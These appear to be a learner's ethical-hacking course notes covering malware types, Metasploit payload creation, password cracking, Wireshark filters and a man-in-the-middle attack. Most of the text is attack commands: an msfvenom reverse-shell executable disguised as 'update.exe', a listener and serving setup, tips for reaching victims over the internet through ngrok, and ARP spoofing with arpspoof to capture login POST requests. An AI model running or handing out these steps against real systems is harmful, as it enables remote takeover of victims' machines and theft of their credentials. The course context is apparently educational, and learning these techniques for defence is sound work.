2025-04-30 19:11

Status:

Tags:

# Malware Threats


# 8/04/25
Malware 
- a Virus is self replicating program that produces its own copy by attaching itself to another program, computer boot section document. 
- Computer Worms are malicious program that replicate execute and spread across the network connections independently without human interaction
- Trojan is malicious program, binded with harmless application program 
## Steps for craeting malware 

Step:1
msfvenom -p windows/meterpeter/reverse_tcp LHOST=<attacker'sIP> LPORT<attacker'port> -f exe -o update.exe
Step:2 Share 




python3 -m http.server

Step:3 Listen 
msfconsole -q  
use exploit/multi/handler
set payload  windows/meterpreter/reverse_tcp 
set LHOST 10.10.10.4
set LPORT 2222
exploit -j 


To crack hash-passwords 
john
john ``<filename>``
john --fromat=hash.txt(defult word list)
john --wordlist=``<filepath><filename>``

To check is machine is vm or not 
-run post/windows/gather/checkvm

rdesktop ``<target IP>``
or 
xfreerdp /v:``<targetIP> /u:<username>``
 /p:``<password>``
 
 
 To view 
 hack-tools 
 
 Fro WAN level attack 
- perform port forwarding on router
- Add public IP of attacker in payload creation step
- Add private IP of attacker in msf listener
- 
  services that allows port forwarding 
ngrok 
portmap.io


Malwares 
- Hackers use Wrappers and Crypters for binding 
 

Stage payload -   windows/meterpreter_bind_tcp
non-Stage payload -    windows/meterpreter/reverse_tcp


## 09/04/25
 To view web login deatils using wireshark 
http.request.method==POST

http.request.method==GET

To display only 
ip.addr==10.10.10.4 (ipaddress)

ip.src_host==10.10.10.4

ip.drs_host==10.10.10.4 (desteation )

ip.src_host==10.10.10.4 && tcp 

ip.src_host==10.10.10.4 | | tcp (icmp or || )

tcp.flags.syn==1

to view only SYN 
tcp.flags.syn==1 && tcp.flags.ack==0

To display  recent
tcp.flags.res==1

Sniffing 
- Passive sniffing  involves listening and capturing tracffic

Man In THE Middle Attack
- Most dangerous and efftive attack which can be used to redirect packets againts this attack 

steps for performing man in the middle attack 

method: 1
steps : 1 - Enable packet forwarding in attacker's device 
echo 1> /proc/sys/net/ipv4/ip_forword (to enable 1 and disable 0)
1. sudo su 
2. cat /proc/sys/net/ipv4/ip_forward
3. echo 1 >  /proc/sys/net/ipv4/ip_forward

steps : 2 - ARP Poisoning /spoofing 
- using  dsnif
sudo apt install dsnif 
arpspoof 
1.''arpspoof -t '' <target's ip> <gateway ip/ router ip> ''
2.  ''arpspoof -t <gateway ip/ router ip> <target's ip> ''
	1. arpspoof -t 10.10.10.5 10.10.10.1 
	2. arpspoof -t 10.10.10.1 10.10.10.5

3. open wire shark 
4. use in filters 
5. http.request.method==POST

method: 2


purpose of promiscu   




### References
